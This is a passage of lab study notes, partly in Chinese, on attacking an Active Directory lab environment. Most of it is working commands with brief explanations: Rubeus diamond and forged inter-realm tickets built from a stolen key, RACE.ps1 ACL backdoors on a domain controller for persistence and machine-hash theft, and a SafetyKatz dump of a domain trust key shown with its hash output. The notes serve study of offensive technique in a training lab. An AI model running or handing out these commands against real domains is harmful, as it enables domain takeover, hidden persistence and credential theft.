C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- We could also use /tgtdeleg option in place of credentials in case we have access as a domain user
```
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorpdc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Persistence using ACLs WMi
>[!NOTE]
>可以當你已經取得管理員（Admin）或域控制器上的域管理員（Domain Admin, DA）權限後使用RACE.ps1調整存取控制清單（ACLs），以取得持久性（persistence）或按需升權（privilege escalation）。

>[!WARNING]
>執行後，會在目標主機 `dcorp-dc` 的 WMI namespace `root\cimv2` 上**新增或修改 ACL（安全描述）**，讓 `studentx` 擁有某些 WMI 存取權限（例如 Query/Execute/Remote Access / Namespace 操作等，實際給哪種權限依該函式實作而定）。結果是 `studentx` 之後能以該帳號透過 WMI/DCOM 或遠端管理 API 對 `dcorp-dc` 做更多操作（例如利用 WMI 遠端執行命令、查詢系統資訊、或作為 lateral movement / persistence 的一部分）。
- `Set-RemotePSRemoting`：修改 PowerShell 遠端（Remoting）端點的 ACL，讓某個帳號可以遠端使用 PS remoting 存取該機器（即使該帳號原本不是 Admin）。
- `Set-RemoteWMI`：修改遠端機器上的 DCOM endpoint 或 WMI namespace 的 ACL，使某帳號可以管控或訪問遠端 WMI／DCOM。

- 導入RACE.ps1
```powershell
C:\AD\Tools\RACE-master\RACE.ps1
```

### 提出修改ACL請求
``` powershell
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
``` powershell
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```
- `-SamAccountName studentx`  
    指定要給權限的帳號（域帳號或本機帳號），這裡是 `studentx`（用 SAM 帳號格式）。
- `-ComputerName dcorp-dc`  
    目標電腦名稱，通常是要修改其 WMI namespace ACL 的主機；`dcorp-dc` 看起來像一台域控制器（Domain Controller）。
- `-namespace 'root\cimv2'`  
    指定要修改的 WMI namespace。`root\cimv2` 是預設且最常用的 namespace（包含許多系統管理類別）。

- 移除ACL
```
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```
### 驗證權利
>[!NOTE]
>驗證是否有WMI Queries on theDC的權利
``` powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

- 於目標主機任意程式碼執行
``` powershell
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
- 利用修改ACL的方式，讓一般用戶可以取得machine account hash
``` powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```
``` powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
## RemoteWMI
>[!note]
>原本是Domain Admin 權限修改 Domain Controller 上 的 security descriptors，把 一般使用者加進去，讓它雖然不是管理員也能用 WMI 遠端管控 DC。
>但是做這件事情的前提是你是目標機器的管理員。

>[!warning]
>RACE is a PowerShell module for executing ACL attacks against Windows targets and Active Directory. RACE can be used for persistence and on demand privilege escalationon Windows machines.
- RACE.ps1 : https://github.com/samratashok/RACE
``` powershell
. C:\AD\Tools\RACE.ps1
```

### 利用WMI存取
``` powershell
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
- 遠端程式碼執行
``` powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```
### 利用PowerShell remoting存取
``` powershell
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```
- 遠端程式碼執行
``` powershell
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### 撈取hash
``` powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```
``` powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
## Domain Trust
>[!NOTE]
>Domain Admin可以撈到 domain trust key

- 利用SafetyKatz dump出domain trust key
``` 
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
```
mimikatz #  **lsadump::evasive-trust /patch**
Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-
3726368948-3917688648)
Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
[ In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
 * 2/24/2023 1:11:33 AM - CLEAR - 79 d9 90 1f 7c db 09 b7 65 a0 e5 e4 50
03 35 8b 99 fb eb bb e7 ba 54 89 b7 b2 f4 fc
 * aes256_hmac
34f94d19178a75cb04b9c10e657623c5ac9074fbc7fcf4e20be8527b77407243
 * aes128_hmac 40856eb80d3323adf23a3b7faad3c180
 * rc4_hmac_nt  132f54e05f7c3db02e97c00ff3879067
```
- 製作金票眷
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```
這邊書輸入的`/sids`是額外附加 SID（這裡是 Enterprise Admins 群組 SID），為了讓票裡的使用者同時具有額外群組身分，`S-1-5-21-335606122-960912869-3279953914`是`MONEYCORP.LOCAL`(目標 parent)的SID，519是Enterprise Admins的RID，`/ldap`是指示 Rubeus 從 LDAP 取一些資訊自動補齊。

| 帳號                  | RID |
| ------------------- | --- |
| Domain Admins       | 512 |
| Domain Users        | 513 |
| Enterprise Admins   | 519 |
| Administrators (本機) | 544 |
>[!TIP]
>拿到 `DOLLARCORP.MONEYCORP.LOCAL` 的 Golden Ticket **不會自動就能進去 `moneycorp.local`**。  除非這兩個域之間有 **信任關係 (Trust)**，而且信任沒有做額外限制，你才能用 DOLLARCORP 的 Golden Ticket 透過信任去換到 moneycorp.local 的存取，這個情境能用 DOLLARCORP 的 Golden Ticket 存取 moneycorp.local，**是因為兩個 domain 之間本來就有 AD 的父子關係 (domain trust)**。
- 拿到金票卷後，要轉成TGS並注入當前Sessions
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```
```
winrs -r:mcorp-dc.moneycorp.local cmd
```
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```
```
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```























